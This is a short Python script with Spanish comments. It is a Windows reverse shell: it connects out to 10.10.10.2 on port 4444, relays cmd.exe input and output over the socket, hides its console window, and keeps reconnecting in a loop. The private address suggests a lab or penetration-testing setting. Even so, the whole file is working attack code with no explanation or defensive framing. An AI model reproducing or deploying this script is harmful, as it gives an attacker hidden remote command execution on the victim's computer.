import os, socket, subprocess, threading
import win32con
import win32gui

def hide_console_window():
    window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(window, win32con.SW_HIDE)

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

while True:  # Bucle infinito
    try:  # Agregamos un bloque try-except para manejar la excepción KeyboardInterrupt
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.10.2", 4444))

        if os.name == "nt":  # Comprobar si el sistema operativo es Windows
            p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            hide_console_window()  # Llamamos a la función para ocultar la ventana de la consola
            p.wait()
        except KeyboardInterrupt:
            s.close()
            pass

        s.close()
    except Exception as e:
        print(f"Se produjo un error: {e}")




